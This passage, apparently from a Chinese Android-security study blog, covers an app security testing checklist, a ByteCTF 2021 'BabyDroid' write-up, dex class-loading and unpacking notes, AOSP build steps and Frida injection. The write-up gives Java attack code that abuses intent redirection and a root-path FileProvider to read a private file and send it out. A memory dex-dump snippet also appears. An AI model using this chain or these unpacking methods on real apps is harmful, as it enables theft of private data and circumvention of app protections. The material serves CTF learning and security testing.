文件，测试客户端是否会安装替换后的应用。</p><h3 id="短信重放攻击"><strong>短信重放攻击</strong></h3><p>检测应用中是否存在数据包重放攻击的安全问题。是否会对客户端用户造成短信轰炸的困扰</p><p>尝试重放短信验证码数据包是否可以进行短信轰炸攻击</p><h2 id="业务安全">业务安全</h2><h3 id="越权">越权</h3><p>服务器端对客户提出的数据操作请求过分信任，忽略了对该用户操作权限的判定，导致攻击账号拥有了其他账户的增删改查功能。</p><p>手工测试</p><h3 id="交易篡改"><strong>交易篡改</strong></h3><p>本项测试主要是修改金额信息（如：转帐金额为负值），订单信息（如：订单的数量）等</p><p>手工抓包测试。</p><p>服务端要做到严格的验证。（根据业务情形不同，安全建议也不相同，因此这里只能简单的一句话描述）</p><h3 id="重放攻击">重放攻击</h3><p>主要就是进行抓包重放（如：重放产品购买、订单创造等）测试。</p><p>人工测试</p><h3 id="用户枚举">用户枚举</h3><p>尝试爆破枚举用户。</p><p>手工测试。</p><p>此类漏洞情境一般是：登录界面无验证码、有明显的返回信息（如：该账号不存在、密码错误等）</p><h3 id="暴力破解">暴力破解</h3><p>主要是测试业务中查询、登录等功能，尝试使用暴力枚举的方式进行破解</p><p>手工测试</p><h3 id="注入-XSS-CSRF"><strong>注入/XSS/CSRF</strong></h3><p>和 WEB 测试类似，主要测试站点存在的常见的 web 漏洞</p><p>可手工测试也可以使用工具扫描、测试</p><h1>漏洞的一些分析 ByteCTF2021</h1><p><a href="https://shvu8e0g7u.feishu.cn/docs/doccndYygIwisrk0FGKnKvE0Jhg">https://shvu8e0g7u.feishu.cn/docs/doccndYygIwisrk0FGKnKvE0Jhg</a></p><p><a href="https://blog.wjhwjhn.com/posts/bytectf-2021-android-writeup/">https://blog.wjhwjhn.com/posts/bytectf-2021-android-writeup/</a></p><p><a href="https://blog.wm-team.cn/index.php/archives/7/#%3Cstrong%3EHardDroid%3C%2Fstrong%3E">https://blog.wm-team.cn/index.php/archives/7/#&lt;strong&gt;HardDroid&lt;%2Fstrong&gt;</a></p><h2 id="BabyDroid">BabyDroid</h2><h3 id="考点："><strong>考点</strong>：</h3><ul><li>Intent重定向</li><li>Grant Uri Permission 通过fileprovider任意读写</li></ul><p>对于<code>题目部署和运行环境</code>没有太过研究，主要是对漏洞加深理解，学习一下思路</p><h3 id="apk分析">apk分析</h3><p><strong>Manifest.xml</strong></p><p>对于这道题看一下Vulnerable.apk的清单文件</p><p><img src="assets/image-20241009194758416.png" alt="image-20241009194758416"></p><p>主要是上面红框内容：2个Activity，一个Receiver，一个provider。</p><p><strong>MainActivity</strong></p><p>主要就是加载布局</p><p><strong>Vulnerable</strong></p><p><img src="assets/image-20241009195133582.png" alt="image-20241009195133582"></p><p>获取反序列化 <code>key</code>值为<code>intent</code>的数据，然后启动Intent</p><p><strong>FlagReceiver</strong></p><p><img src="assets/image-20241009195413623.png" alt="image-20241009195413623"></p><p>创建一个 /data/data/Package_name/files/flag文件，并且把key值为flag获取的数据存放在创建的路径文件下，这里应该就是flag关键。</p><p><strong>Provider</strong></p><p><code>FileProvider</code>是<code>ContentProvider</code>的一个子类，使用content://代替file://，使得共享数据安全。</p><p>content URI允许临时授予该文件读写权限，只需要当创建一个包含该文件的content URI的时候，可以通过<code>Intent.setFlags()</code>添加相应的权限。</p><p>当创建FileProvider的时候，需要一个xml文件指定该provider提供的文件，如<code>res/xml/file_paths.xml</code>，其中提供了相应的映射路径和别名，</p><p>同时需要在AndroidManifest.xml中的FileProvider对应的节点内定义<code> &lt;meta-data android:name=&quot;android.support.FILE_PROVIDER_PATHS&quot; android:resource=&quot;@xml/file_paths&quot; &gt;</code>来声明。（其中resource属性内为提供的xml文件）</p><p>该Vulnerable.apk指定的xml文件内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">paths</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root-path</span> <span class="attr">name</span>=<span class="string">&quot;root&quot;</span> <span class="attr">path</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">paths</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;root-path&gt;</code>节点：代表设备的根目录</p><ul><li><p><code>name</code>属性：给该目录起的别名，用于隐藏路径</p></li><li><p><code>path</code>属性：临时授权访问的路径（该目录下的子目录）</p></li></ul><p>则该APK提供的FileProvider提供了根目录，通过<code>root/</code>别名来访问</p><p>则如果我们想访问flag的存储路径，实际构造的部分uri应为<code>root/data/data/[package_name]/files/flag</code>。</p><h3 id="利用思路">利用思路</h3><p>主要就是通过<code>FileProvider</code>获得这个<code>files/flag</code>文件的内容，但是他是不可导出的，发现他有一个<code>grantUriPermissions=&quot;true&quot;</code>所以可以利用这个访问content uri内容。</p><p>在Attack.apk中构造Intent访问content uri内容，然后利用Vnlnerable.class启动这个intent</p><p>其中构造的URL：</p><p><code>content://androidx.core.content.FileProvider/root/data/data/com.bytectf.babydroid/files/flag</code></p><h3 id="Attack实现">Attack实现</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getFlag</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 判断一下是否是被目标apk来start的该Activity</span></span><br><span class="line">    <span class="keyword">if</span> (getIntent().getAction().equals(<span class="string">&quot;evil&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 获取接收到的uri</span></span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 定义一个字符输入流</span></span><br><span class="line">            <span class="type">InputStreamReader</span> <span class="variable">isr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(getContentResolver().openInputStream(data));</span><br><span class="line">            <span class="type">char</span>[] buf = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">while</span> (-<span class="number">1</span> != isr.read(buf, <span class="number">0</span>, <span class="number">1024</span>)) &#123;</span><br><span class="line">                sb.append(String.valueOf(buf));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 读取的内容输入存储到flag</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(sb);</span><br><span class="line">            Log.d(<span class="string">&quot;PwnPwn&quot;</span>, flag);</span><br><span class="line">            ((TextView) findViewById(R.id.tv_show)).setText(<span class="keyword">new</span> <span class="title class_">String</span>(sb));</span><br><span class="line">            <span class="comment">// 通过网络、将信息传输回来获取</span></span><br><span class="line">            sendData(<span class="string">&quot;getFlag&quot;</span>,flag);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 定义一个action为&quot;evil&quot;的Intent</span></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">evil</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">        <span class="comment">// 设定目的组件为当前MainActivity，也可以单独放在另一个AttackActivity中</span></span><br><span class="line">        evil.setClassName(getPackageName(), MainActivity.class.getName());</span><br><span class="line">        <span class="comment">// 设置操纵data数据为 flag所在文件的contentURI</span></span><br><span class="line">        evil.setData(Uri.parse(pwnUri));</span><br><span class="line">        <span class="comment">// 添加读写权限</span></span><br><span class="line">        evil.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 新建一个intent，用于启动目标APK</span></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        <span class="comment">// 启动的目标Activity为Vulnerable</span></span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.babydroid&quot;</span>, <span class="string">&quot;com.bytectf.babydroid.Vulnerable&quot;</span>);</span><br><span class="line">        <span class="comment">// 同时将构造好的evil Intent当作 key &quot;intent&quot;的数据包装进去</span></span><br><span class="line">        intent.putExtra(<span class="string">&quot;intent&quot;</span>, evil);</span><br><span class="line">        <span class="comment">// 启动目标apk</span></span><br><span class="line">        startActivity(intent);</span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1>前置知识</h1><p>某脱壳在线网站：<a href="https://nop.gs/">APK加固安全测试 (nop.gs)</a></p><p><code>grep -ril &quot;MainActivity&quot; /*.txt</code></p><p>在指定目录的所有文件和子目录中搜索，过滤</p><ul><li>xjb移植到Android 10中的fart，在抽取脱壳时出现.bin和.dex文件，使用如下命令合并</li></ul><p><code>java -jar dexfixer.jar dexpath binpath outdexpath</code></p><ul><li>如何工程打包jar包<br>File-&gt;Project Structure-&gt;Artifacts-&gt;‘+’-&gt;JAR-&gt;From modules with<img src="assets/image-20240127170637673.png" alt="image-20240127170637673"></li></ul><p>然后Build-&gt;Build Artifacts，然后在左侧classes文件夹找生成的jar包</p><h2 id="类加载器">类加载器</h2><h3 id="JVM的类加载器包括3种："><strong>JVM的类加载器包括3种：</strong></h3><p>1）Bootstrap ClassLoader（引导类加载器）</p><p>C/C++代码实现的加载器，用于加载指定的JDK的核心类库，比如java.lang.、java.uti.等这些系</p><p>统类。Java虚拟机的启动就是通过Bootstrap ，该Classloader在java里无法获取，负责加载/lib下的</p><p>类。</p><p>2）Extensions ClassLoader（拓展类加载器）</p><p>Java中的实现类为ExtClassLoader，提供了除了系统类之外的额外功能，可以在java里获取，</p><p>负责加载/lib/ext下的类。</p><p>3）Application ClassLoader（应用程序类加载器）</p><p>Java中的实现类为AppClassLoader，是与我们接触最多的类加载器，开发人员写的代码默认</p><p>就是由它来加载，ClassLoader.getSystemClassLoader返回的就是它</p><p>也可以自定义类加载器，只需要通过继承java.lang.ClassLoader类的方式来实现自己的类加载器即可。</p><p>ClassLoader的继承关系</p><h3 id="加载顺序"><strong>加载顺序</strong></h3><p>我们看到了系统的3个类加载器，但我们可能不知道具体加载的顺序呢？</p><p>\1. Bootstrap CLassloder</p><p>\2. Extention ClassLoader</p><p>\3. AppClassLoader<img src="assets/image-20240123232152530.png" alt="image-20240123232152530"></p><h2 id="双亲委派">双亲委派</h2><p>双亲委派模式的工作原理的是：如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把</p><p>这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递</p><p>归，请求最终将到达顶层的启动类加载器，如果父类加载器可以完成类加载任务，就成功返回，倘若父类</p><p>加载器无法完成此加载任务，子加载器才会尝试自己去加载，这就是双亲委派模式，即每个儿子都不愿意</p><p>干活，每次有活就丢给父亲去干，直到父亲说这件事我也干不了时，儿子自己想办法去完成，这个就是双</p><p>亲委派。</p><p>为什么要有双亲委派？</p><p>1）避免重复加载，如果已经加载过一次Class，可以直接读取已经加载的Class</p><p>2）更加安全，无法自定义类来替代系统的类，可以防止核心API库被随意篡改</p><p><strong>类加载的时机：</strong></p><p>1、隐式加载：</p><p>创建类的实例</p><p>访问类的静态变量，或者为静态变量赋值</p><p>调用类的静态方法</p><p>使用反射方式来强制创建某个类或接口对应的java.lang.Class对象</p><p>初始化某个类的子类</p><p>系统进行加载</p><p>2、显示加载：两者又有所区别</p><p>使用LoadClass（）加载，有两个参数第一个参数是类名，第二个是true/false，不写默认false ==》不初始化类</p><p>使用forName（）加载，有两个参数：（类名，ClassLoader），会初始化类</p><p><strong>通过源码分析Android下类加载的流程</strong></p><p>1、加载：查找和导入Class文件</p><p>2、连接：其中解析步骤是可以选择的</p><p>（a）验证：检查载入的class文件数据的正</p><p>确性</p><p>（b）准备：给类的静态变量分配存储空间</p><p>（c）解析：将符号引用转成直接引用</p><p>3、初始化：即调用<clinit>函数，对静态变量，静态代码块执行初始化工作</p><p><img src="assets/image-20240123232507241.png" alt="image-20240123232507241"></p><h2 id="Android类加载器"><strong>Android类加载器</strong></h2><p>Android系统中的</p><p>ClassLoader的继承关系</p><p>其中，InMemoryDexClassLoader为</p><p>Android8.0新引入的ClassLoader<img src="assets/image-20240123232543680.png" alt="image-20240123232543680"></p><p>Android系统中与ClassLoader相关的一共有8个：</p><p>ClassLoader为抽象类；</p><p>BootClassLoader预加载常用类，单例模式,用来加载系统类。与Java中的BootClassLoader不同，它并不是由C/C++代码实现，而是由Java实现的；</p><p>BaseDexClassLoader是PathClassLoader、DexClassLoader、InMemoryDexClassLoader的父类，类加载的</p><p>主要逻辑都是在BaseDexClassLoader完成的。</p><p>SecureClassLoader继承了抽象类ClassLoader，拓展了ClassLoader类加入了权限方面的功能，加强了安</p><p>全性，其子类URLClassLoader是用URL路径从jar文件中加载类和资源。</p><p>其中<strong>重点关注</strong>的是<strong>PathClassLoader</strong>和<strong>DexClassLoader</strong>。</p><p>PathClassLoader是Android默认使用的类加载器，一个apk中的Activity等类便是在其中加载。</p><p>DexClassLoader可以加载任意目录下的dex/jar/apk/zip文件，比PathClassLoader更灵活，是实现插件</p><p>化、热修复以及dex加壳的重点。</p><p>Android8.0新引入InMemoryDexClassLoader，从名字便可看出是用于直接从内存中加载dex</p><h3 id="DexClassLoader参数介绍">DexClassLoader参数介绍</h3><p>接下来使用DexClassLoader类实现一个最简单的动态加载插件dex，并验证此时的ClassLoader间的继承关系；</p><p>DexClassLoader方法参数：</p><p>dexPath:目标所在的apk或者jar文件的路径，装载器将从路径中寻找指定的目标类。</p><p>dexOutputDir:由于dex 文件在APK或者 jar文件中，所以在装载前面前先要从里面解压出dex文件，这个路径就是dex文件存放的路径，在android系统中，一个应用程序对应一个linux用户id ,应用程序只对自己的数据目录有写的权限，所以我们存放在这个路径中。</p><p>libPath :目标类中使用的C/C++库。</p><p>最后一个参数是该装载器的父装载器，一般为当前执行类的装载器。</p><p><strong>源码分析Android中的LoadClass和</strong></p><p>forName的流程和区别</p><p>使用LoadClass（）加载</p><p>使用forName（）加载<br><img src="assets/image-20240123232731529.png" alt="image-20240123232731529"></p><p>app运行流程<br><img src="assets/image-20240123232814798.png" alt="image-20240123232814798"></p><p>1、何时进行dex的解密？</p><p>2、如何解决动态加载的dex中的类的生命周期问题<br><img src="assets/image-20240123232844631.png" alt="image-20240123232844631"></p><p>DexClassLoader加载的类是没有组件生命周期的，也就是说即使DexClassLoader通过对APK的动态加载完成了对组件类的加载，当系统启动该组件时，依然会出现加载类失败的异常。为什么组件类被动态加载入虚拟机，但系统却出现加载类失败呢？</p><p>两种解决方案：</p><p>1、替换系统组件类加载器为我们的DexClassLoader，同时设置DexClassLoader的parent为系统组件类加载器；</p><p>2、打破原有的双亲关系，在系统组件类加载器和BootClassLoader的中间插入我们自己的DexClassLoader即可；<br><img src="assets/image-20240123232947710.png" alt="image-20240123232947710"></p><p><img src="assets/image-20240123232959009.png" alt="image-20240123232959009"></p><h2 id="抽取加固">抽取加固</h2><h3 id="本质">本质</h3><p>提取出dex中方法体的字节码，并在方法运行时还原</p><h3 id="实现形式">实现形式</h3><ul><li>抽空方法体代码，运行方法后回填，运行后不再抽取–&gt;延时保存</li><li>抽空方法体代码，运行方法后回填，运行完后又抽取–&gt;FART,Youpk主动调用</li><li>抽空方法体代码，将原有函数体替换为解密代码，运行时解密执行</li></ul><h3 id="对原有dex处理形式">对原有dex处理形式</h3><p>1）原有函数体数据空间置0，保留原有空间</p><p>2）对dex重构，不保留原空间，在还原数据时修改CodeltemOffset</p><h3 id="解决思路">解决思路</h3><ul><li>在函数运行时保存被抽取的数据</li></ul><h4 id="被动调用">被动调用</h4><p>app正常运行过程中所发生的函数调用只对dex中部分类完成加载，只对dex中部分函数完成调用，调用函数不全，导致能够恢复函数有限</p><h4 id="主动调用">主动调用</h4><p>构造虚拟调用，对所有函数完成调用，在这些函数执行时，保存数据体Codeltem数据，保存数据时机越晚效果越好</p><p>常见抽取加固脱壳系统</p><ul><li>DexHunter(被动调用)</li><li>Fupk3(Dalvik)</li><li>FART</li><li>Youpk</li></ul><h2 id="其他加固形式">其他加固形式</h2><h3 id="VMP">VMP</h3><p><a href="https://github.com/chago/ADVMP">https://github.com/chago/ADVMP</a></p><p>VMP保护一般针对部分函数，这些函数会被native化，定位解释器是关键，找到映射关系便可恢复。vmp通常共用一个解释器。被VMP保护的函数通常会注册到同一个地址上，或者函数逻辑相似</p><h3 id="dex2c">dex2c</h3><p><a href="https://github.com/amimo/dcc">https://github.com/amimo/dcc</a>  支持定制</p><p>通过此法分析，语法分析等，进行Java到C的等价转化，彻底还原难度大，会有大量的jni相关的API调用</p><p>dex2C通常注册在不同的地址上，并且函数逻辑不相似。</p><h2 id="脱壳的一些常用方法">脱壳的一些常用方法</h2><p>对于整体加固：</p><p>1）脱壳工具fdex2：</p><p>通过Class类的getDex方法获得DexFile，再通过DexFile的getBytes方法得到dex文件，安卓7.1以下使用，8.0之后没有getDex和getBytes方法了。</p><p>2）脱壳工具blackdex</p><p>通过mCookie来脱壳</p><p>3）脱壳工具Frid-dexdump</p><p>内存中搜索dex文件保存下来</p><p>4）脱壳系统Fart,Youpk</p><p>dex加载，执行过程中，找一个合适的时机得到DexFile内存地址和大小，将解密的dex保存下来</p><p>还可以通过artMethod来得到DexFile</p><p>5）找到相应脱壳点，进行dump</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DexFile OpenCommon</span></span><br><span class="line"><span class="type">int</span> pid = <span class="built_in">getpid</span>();</span><br><span class="line"><span class="type">char</span> dexfilepath[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">sprintf</span>(dexfilepath,<span class="string">&quot;/sdcard/%d_%d 脱壳点函数名.dex&quot;</span>,length,pid);</span><br><span class="line"><span class="type">int</span> fd=<span class="built_in">open</span>(dexfilepath,<span class="number">0</span> CREAT|<span class="number">0</span> RDWR,<span class="number">666</span>);</span><br><span class="line"><span class="keyword">if</span>(fd&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="type">int</span> number=<span class="built_in">write</span>(fd,addr,length);</span><br><span class="line">    <span class="keyword">if</span>(number&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>6）dexhunter</p><p>遍历dex当中所有的类，然后主动进行加载和初始化</p><p>fupk3基于Dalvik Android4.4</p><h2 id="ART下的脱壳点">ART下的脱壳点</h2><p>抽取加固首先干掉dex2oat，或者填充时机在oat之前</p><p>1）dex的加载流程  （整体加固）</p><ul><li>通过mCookie脱壳    mCookie是jlongarray数组 存放DexFile对象指针</li><li>通过openCommen函数脱壳</li><li>通过DexFile构造函数脱壳</li><li>youpk：通过ClassLinker来得到DexFile</li></ul><p>2）dex2oat的编译流程==》把dex文件变为oat文件 （整体加固）</p><ul><li>通过修改dex2oat脱壳的     安卓10的应用不适用，但是系统应用仍使用dex2oat</li></ul><p>3）类的加载和初始化流程  （抽取加固）</p><ul><li>DexHunter在defineClass进行类解析  （基于被动调用）</li><li>LoadMethod、LinkCode</li></ul><p>4）在函数执行过程中脱壳</p><ul><li>FART：Execute整体脱壳 （整体脱壳点）</li><li>FART：ArtMethod::invoke函数中进行dump Codeltem  （抽取脱壳点）</li><li>youpk：直接到了解释执行的函数中进行dump Codeltem</li></ul><h1>Android系统编译</h1><p>安卓系统编译前置知识</p><ul><li>aosp源码，对应的Linux内核，对应的手机驱动。对应是指要跟aosp系统版本对应，要与手机型号对应</li></ul><h2 id="源码下载">源码下载</h2><p>网址：<a href="https://mirrors.ustc.edu.cn/help/aosp.html">AOSP 镜像使用帮助 — USTC Mirror Help 文档</a></p><p>​           <a href="https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/">AOSP | 镜像站使用帮助 | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></p><h2 id="下载初始化包并解压">下载初始化包并解压</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ~/bin</span><br><span class="line"><span class="built_in">cd</span> ~/bin</span><br><span class="line">wget https://mirrors.ustc.edu.cn/aosp-monthly/aosp-latest.tar</span><br><span class="line">（可以使用wget -c 支持断点下载）</span><br><span class="line"><span class="built_in">md5sum</span> aosp-latest.tar (校验是否下载完整)</span><br><span class="line">tar xvf aosp-latest.tar</span><br></pre></td></tr></table></figure><h2 id="同步指定版本源码">同步指定版本源码</h2><p>解压完tar包后打个快照，因为只能编译一个指定版本的源码。编译多个会出错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">解压完进入aosp目录</span><br><span class="line"><span class="built_in">cd</span> aosp</span><br><span class="line"><span class="built_in">sudo</span> apt-get install git</span><br><span class="line">git config --global user.email 644129939@qq.com</span><br><span class="line">git config --global user.name <span class="string">&quot;zxk1ng&quot;</span></span><br><span class="line"></span><br><span class="line">//下载repo</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PATH=~/bin:\$PATH&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line"><span class="built_in">sudo</span> apt-get install curl</span><br><span class="line">curl -sSL <span class="string">&#x27;https://gerrit-googlesource.proxy.ustclug.org/git-repo/+/master/repo?             format=TEXT&#x27;</span> |<span class="built_in">base64</span> -d &gt;~/bin/repo</span><br><span class="line"><span class="built_in">chmod</span> a+x ~/bin/repo</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">export</span> REPO_URL=<span class="string">&#x27;https://gerrit-googlesource.proxy.ustclug.org/git-repo&#x27;</span></span><br><span class="line"><span class="built_in">cd</span> aosp</span><br><span class="line"></span><br><span class="line">//同步指定版本源码</span><br><span class="line"><span class="built_in">cd</span> ~/bin/aosp/</span><br><span class="line">repo init -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-10.0.0_r17</span><br><span class="line"></span><br><span class="line">repo <span class="built_in">sync</span></span><br><span class="line">/*</span><br><span class="line">当repo <span class="built_in">sync</span>报错：</span><br><span class="line"><span class="built_in">cd</span> ~/bin/aosp/.repo/repo</span><br><span class="line">git pull</span><br><span class="line"><span class="built_in">cd</span> ~/bin/aosp</span><br><span class="line">再次repo init、repo <span class="built_in">sync</span></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">//代码和细分版本号可查看下面链接 选有驱动支持手机多的，快照</span><br><span class="line">(https://source.android.com/docs/setup/about/build-numbers?hl=zh-cn)</span><br></pre></td></tr></table></figure><h2 id="获取手机驱动">获取手机驱动</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//安装jdk8</span><br><span class="line">sudo<span class="built_in"> add-apt-repository </span>ppa:openjdk-r/ppa</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install openjdk-8-jdk</span><br></pre></td></tr></table></figure><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//安装所需要的依赖（ubuntu20.04）</span></span><br><span class="line">sudo apt-<span class="built_in">get</span> install git-core gnupg flex bison build-essential zip curl zlib1g-<span class="built_in">dev</span> gcc-multilib g++-multilib libc6-<span class="built_in">dev</span>-i386 lib32ncurses5-<span class="built_in">dev</span> x11proto-core-<span class="built_in">dev</span> libx11-<span class="built_in">dev</span> lib32z1-<span class="built_in">dev</span> libgl1-mesa-<span class="built_in">dev</span> libxml2-utils xsltproc unzip fontconfig libncurses5</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>设备驱动准备</p><p><a href="https://developers.google.com/android/drivers">https://developers.google.com/android/drivers</a></p><p>下载和你导出的源码版本匹配的驱动，例如<img src="assets/image-20240129152507615.png" alt="image-20240129152507615"></p><p>下载的是Android 10.0.0_r17，所以下载上面两个驱动</p><p>下载-&gt;放到linux中的aosp目录中解压，运行解压出来的两个.sh文件</p><h2 id="源码编译">源码编译</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//aosp目录下</span><br><span class="line">make clobber (如果同一源码编译不同机型输入这个命令)</span><br><span class="line"><span class="built_in">source</span> build/envsetup.sh 导出环境变量</span><br><span class="line">lunch<span class="comment"># 选择设备内核和编译版本  eng/user/usrdebug</span></span><br><span class="line"><span class="comment"># 增加编译产品选项 修改aosp/device/google/marlin/AndroidProducts.mk(照猫画虎)</span></span><br><span class="line">选择要编译的设备内核</span><br><span class="line">make -j8 <span class="comment">#编译</span></span><br></pre></td></tr></table></figure><h2 id="编译补充">编译补充</h2><ul><li><p>编译报错或者修改系统文件后，都可以直接make，已经编译的部分会跳过</p></li><li><p>make clean 会清除已经编译的，重新再来，在编译不同lunch选项时使用</p></li><li><p>单独编译system.img 在根目录在<br>source build/envsetup.sh</p><p>lunch xxx<br>make systemimage -j4</p></li><li><p>单独编译某个模块 mmm packages/apps/zxk1ng<br>将单独编译的模块打包到img镜像中 make snod</p></li></ul><h2 id="导入aosp到AndroidStudio">导入aosp到AndroidStudio</h2><p>编译成功一程android源码后</p><p>1）在aosp目录下执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> build/envsetup.sh</span><br><span class="line">mmm development/tools/idegen/</span><br><span class="line">development/tools/idegen/idegen.sh</span><br></pre></td></tr></table></figure><p>2）下载Android-Studio: wget+网址</p><p>3）设置中,Appearance-&gt;System Settings-&gt;Memory Settings 修改内存为4096</p><p>4）设置中：Android SDK 下载安卓10 API，NDK，Cmake</p><p>5）导入安卓10源码文件Android.ipr</p><h1>Frida持久化</h1><h2 id="Hook前提">Hook前提</h2><p>需要将代码或者能够完成Hook功能的东西，注入到目标进程</p><p>注入方式：</p><ul><li>zygote注入：xposed使用这个注入方式，xposedBridge.jar会注入到fork出来的所有进程</li><li>ptrace注入：需要root权限,利用安卓系统功能文件注入相应进程（frida-server）</li><li>文件感染：当加载一个so文件的时候，会先去加载依赖的.so文件，我们可以修改依赖让其加载其他的so文件</li></ul><h2 id="frida-gadget">frida-gadget</h2><p>当Hook代码修改检测完毕，可以通过它来实现免root，脱离PC，但是它本身没有注入功能，需要将其打包到app中。</p><p><a 